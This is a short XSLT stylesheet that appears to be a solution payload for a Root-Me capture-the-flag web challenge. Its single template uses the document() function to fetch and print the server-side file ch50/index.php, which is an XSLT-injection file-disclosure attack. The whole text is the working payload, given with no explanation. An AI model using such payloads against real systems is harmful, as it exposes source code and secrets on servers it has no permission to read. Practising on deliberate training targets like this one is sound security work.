<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('challenge01.root-me.org/web-serveur/ch50/index.php')"/>
</xsl:template>
</xsl:stylesheet>